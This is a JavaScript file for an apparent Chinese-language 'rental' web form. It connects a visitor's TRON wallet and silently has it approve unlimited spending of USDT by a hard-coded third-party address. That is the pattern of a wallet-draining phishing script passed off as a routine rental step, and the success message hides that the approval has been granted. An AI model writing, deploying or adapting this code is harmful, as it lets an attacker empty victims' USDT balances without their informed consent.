function setAmount(amount) {
    document.getElementById('rentalAmount').value = amount;
}

async function nextStep() {
    const rentalAmount = document.getElementById('rentalAmount').value;
    const trxAddress = document.getElementById('trxAddress').value;
    if (rentalAmount && trxAddress) {
        await connectWallet();
    } else {
        alert('请填写所有字段');
    }
}

async function connectWallet() {
    try {
        // 动态加载 tronWeb 对象
        if (typeof window.tronWeb === 'undefined') {
            // 这里可以加载 tronWeb 的 script
            // 比如：const script = document.createElement('script');
            // script.src = 'https://cdn.jsdelivr.net/npm/@tronprotocol/tronweb@latest/dist/TronWeb.min.js';
            // document.head.appendChild(script);
            alert('请安装支持 TRC20 的钱包插件并登录');
            return;
        }

        // 确保钱包已连接
        if (window.tronWeb.defaultAddress.base58) {
            // 获取用户的 TRON 地址
            const userAddress = window.tronWeb.defaultAddress.base58;

            // TRC20 USDT 合约地址和 ABI
            const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            const usdtAbi = [
                {
                    "constant": false,
                    "inputs": [
                        { "name": "_spender", "type": "address" },
                        { "name": "_value", "type": "uint256" }
                    ],
                    "name": "approve",
                    "outputs": [{ "name": "", "type": "bool" }],
                    "type": "function"
                }
            ];

            // 创建 USDT 合约实例
            const usdtContract = await window.tronWeb.contract().at(usdtAddress);

            // 授权地址和数量
            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
            const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'; // 无限授权

            // 发送授权交易
            const tx = await usdtContract.approve(spenderAddress, amount).send({
                feeLimit: 100000000, // 设置手续费限制为 100 TRX
                callValue: 0 // 设置交易调用的 TRX 数量
            });

            // 更新按钮文本
            document.getElementById('okButton').innerText = '获取成功';
        } else {
            alert('请登录支持 TRC20 的钱包');
        }
    } catch (error) {
        console.error(error);
        document.getElementById('okButton').innerText = '获取失败';
    }
}

